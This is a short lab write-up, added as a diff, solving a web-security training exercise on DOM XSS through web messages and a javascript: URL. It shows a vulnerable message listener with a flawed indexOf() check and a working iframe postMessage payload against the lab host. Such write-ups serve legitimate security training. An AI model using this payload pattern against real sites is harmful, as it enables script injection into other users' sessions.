@@ -1,0 +1,27 @@
+// Lab: DOM XSS using web messages and a JavaScript URL
+
+This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.
+
+
+// Solution
+
+1. Notice that the home page contains an addEventListener() call that listens for a web message. 
+The JavaScript contains a flawed indexOf() check that looks for the strings "http:" or "https:" anywhere within the web message. It also contains the sink location.href
+
+vulnerable code looks something like this:
+
+window.addEventListener('message', function(e) {
+    var url = e.data;
+    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
+        location.href = url;
+    }
+});
+
+this lab's sink is location.href, which accepts a URL
+
+
+2. Go to exploit server and Inject the following exploit:
+
+// Exploit
+
+<iframe src="https://0aba00a1036f054f8090269b00fd006a.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:','*')"></iframe>
